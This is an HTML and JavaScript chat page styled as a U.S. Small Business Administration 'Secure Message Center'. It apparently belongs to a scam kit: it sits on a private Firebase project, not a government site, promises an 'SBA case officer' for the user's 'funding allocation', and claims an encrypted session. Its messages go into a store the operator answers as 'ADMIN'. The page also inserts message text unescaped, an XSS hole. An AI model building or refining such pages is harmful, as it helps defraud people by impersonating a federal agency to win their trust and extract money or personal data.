<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SBA | Secure Message Center</title>
    <style>
        :root { --sba-blue: #00274c; --sba-accent: #0071bc; --sba-red: #ba0c2f; --bg: #f1f5f9; }
        * { box-sizing: border-box; }
        
        body { 
            background: var(--bg); margin: 0; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
            display: flex; justify-content: center; align-items: center; height: 100vh;
        }

        /* Centered Card for Mobile (Not Full Screen) */
        .chat-card {
            width: 92%; max-width: 400px; height: 82vh; 
            background: white; border-radius: 12px; display: flex; 
            flex-direction: column; overflow: hidden; 
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
            border: 1px solid #d1d5db; position: relative;
        }

        /* Top Official Header */
        .header { 
            background: var(--sba-blue); color: white; padding: 15px; 
            text-align: left; border-bottom: 3px solid var(--sba-red);
            display: flex; align-items: center; gap: 10px;
        }

        .header-info h2 { margin: 0; font-size: 13px; letter-spacing: 1px; font-weight: 800; }
        .header-info p { margin: 0; font-size: 9px; opacity: 0.8; text-transform: uppercase; }

        .status-bar {
            background: #f8fafc; padding: 8px 15px; border-bottom: 1px solid #edf2f7;
            display: flex; justify-content: space-between; align-items: center;
        }
        .status-indicator { font-size: 10px; font-weight: 700; color: #10b981; display: flex; align-items: center; gap: 5px; }
        .dot { width: 6px; height: 6px; background: #10b981; border-radius: 50%; animation: pulse 1.5s infinite; }

        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }

        /* Message Area */
        #messageDisplay { 
            flex: 1; overflow-y: auto; padding: 15px; display: flex; 
            flex-direction: column; gap: 12px; background: #ffffff;
        }

        .welcome-box {
            background: #fffbeb; border: 1px solid #fef3c7; 
            padding: 12px; border-radius: 8px; font-size: 11px; color: #92400e;
            line-height: 1.5; margin-bottom: 10px;
        }

        /* Professional Bubbles */
        .bubble { 
            max-width: 85%; padding: 12px; border-radius: 12px; font-size: 13px; 
            line-height: 1.5; position: relative;
        }
        
        .user { 
            align-self: flex-end; background: #f1f5f9; color: #1e293b; 
            border-bottom-right-radius: 2px; border: 1px solid #e2e8f0;
        }
        .admin { 
            align-self: flex-start; background: var(--sba-blue); color: white; 
            border-bottom-left-radius: 2px;
        }

        .tag { font-size: 8px; font-weight: 900; margin-bottom: 4px; display: block; text-transform: uppercase; letter-spacing: 0.5px; opacity: 0.7; }

        /* Input Area */
        .input-area { padding: 12px; background: #f8fafc; border-top: 1px solid #eee; display: flex; gap: 8px; }
        input { 
            flex: 1; padding: 10px 15px; border: 1px solid #cbd5e1; border-radius: 6px; 
            outline: none; font-size: 14px; background: white;
        }
        input:focus { border-color: var(--sba-accent); box-shadow: 0 0 0 2px rgba(0,113,188,0.1); }

        .send-btn { 
            background: var(--sba-blue); color: white; border: none; 
            width: 40px; height: 40px; border-radius: 6px; cursor: pointer;
            display: flex; align-items: center; justify-content: center;
        }

        .back-btn {
            position: absolute; top: -45px; left: 0;
            background: transparent; color: var(--sba-blue); border: none;
            font-size: 12px; font-weight: 800; cursor: pointer; text-decoration: underline;
        }
    </style>
</head>
<body>

    <div class="chat-card">
        <button class="back-btn" onclick="location.href='dashboard.html'">← RETURN TO DASHBOARD</button>

        <div class="header">
            <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:18px;">
            <div class="header-info">
                <h2>SECURE MESSAGE CENTER</h2>
                <p>U.S. Small Business Administration</p>
            </div>
        </div>

        <div class="status-bar">
            <div class="status-indicator"><div class="dot"></div> AGENT SECURELY CONNECTED</div>
            <div style="font-size: 9px; color: #64748b; font-weight: bold;">ID: SBA-PORTAL</div>
        </div>

        <div id="messageDisplay">
            </div>

        <div class="input-area">
            <input type="text" id="userInput" placeholder="Type your inquiry..." autocomplete="off">
            <button id="sendBtn" class="send-btn">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
            </button>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
        import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
        import { getFirestore, collection, addDoc, query, where, onSnapshot, serverTimestamp, doc, getDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyCq8CgTyNbKVbUm_GItIC7FAvTuNrNspxI",
            authDomain: "sba-portal-2026-f1253.firebaseapp.com",
            projectId: "sba-portal-2026-f1253",
            storageBucket: "sba-portal-2026-f1253.firebasestorage.app",
            messagingSenderId: "363290267220",
            appId: "1:363290267220:web:2a3e8601c11be5dd6e27c1"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);

        const display = document.getElementById('messageDisplay');
        const input = document.getElementById('userInput');
        let userName = "Applicant";

        onAuthStateChanged(auth, async (user) => {
            if (user) {
                const uSnap = await getDoc(doc(db, "users", user.uid));
                if(uSnap.exists()) userName = uSnap.data().fullName || "Applicant";

                const q = query(collection(db, "support_tickets"), where("userId", "==", user.uid));

                onSnapshot(q, (snapshot) => {
                    display.innerHTML = `
                        <div class="welcome-box">
                            <strong>Official Case Communication</strong><br>
                            Your session is encrypted. An SBA case officer is available to assist with your funding allocation for <b>${userName}</b>.
                        </div>
                    `;
                    
                    const msgs = [];
                    snapshot.forEach(d => msgs.push(d.data()));
                    msgs.sort((a, b) => (a.timestamp?.seconds || 0) - (b.timestamp?.seconds || 0));

                    msgs.forEach(m => {
                        const div = document.createElement('div');
                        div.className = `bubble ${m.sender === 'ADMIN' ? 'admin' : 'user'}`;
                        const tag = m.sender === 'ADMIN' ? 'SBA OFFICER' : 'YOU';
                        div.innerHTML = `<span class="tag">${tag}</span>${m.message}`;
                        display.appendChild(div);
                    });
                    
                    display.scrollTop = display.scrollHeight;
                });

            } else { window.location.href = 'index.html'; }
        });

        const sendMessage = async () => {
            const msg = input.value.trim();
            if(!msg || !auth.currentUser) return;
            const uid = auth.currentUser.uid;
            input.value = ""; 

            try {
                await addDoc(collection(db, "support_tickets"), {
                    userId: uid,
                    userName: userName,
                    message: msg,
                    sender: "USER",
                    timestamp: serverTimestamp()
                });
            } catch (err) { console.error(err); }
        };

        document.getElementById('sendBtn').onclick = sendMessage;
        input.onkeypress = (e) => { if(e.key === 'Enter') sendMessage(); };
    </script>
</body>
</html>
